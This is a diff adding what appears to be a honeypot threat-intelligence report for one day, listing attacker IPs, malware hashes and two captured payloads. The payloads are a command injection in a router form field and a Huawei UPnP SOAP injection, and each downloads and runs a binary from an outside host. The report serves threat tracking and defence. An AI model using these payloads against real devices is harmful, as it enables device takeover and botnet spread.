@@ -1,0 +1,19 @@
+Top 5 IPs for 2023-12-12:
+117.158.62.67
+139.162.151.190
+162.14.106.145
+3.250.164.143
+61.133.58.107
+
+Malware seen: 
+Hash: 9ea57b5f995b9dbb1e6a9262a9abc2a348a56efa215ceb3a4072ef9c02a876c5
+https://www.virustotal.com/gui/file/9ea57b5f995b9dbb1e6a9262a9abc2a348a56efa215ceb3a4072ef9c02a876c5
+Hash: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+Hash: 76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *arm*; rm -rf *arm5*; rm -rf *arm6*; rm -rf *arm7*; rm -rf *m68k*; rm -rf *mips*; rm -rf *mpsl*; rm -rf *ppc*; rm -rf *sh4*; rm -rf *spc*; rm -rf *x86*; rm -rf *x86_64*;wget http://103.67.197.87/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;}
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 45.95.147.171 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
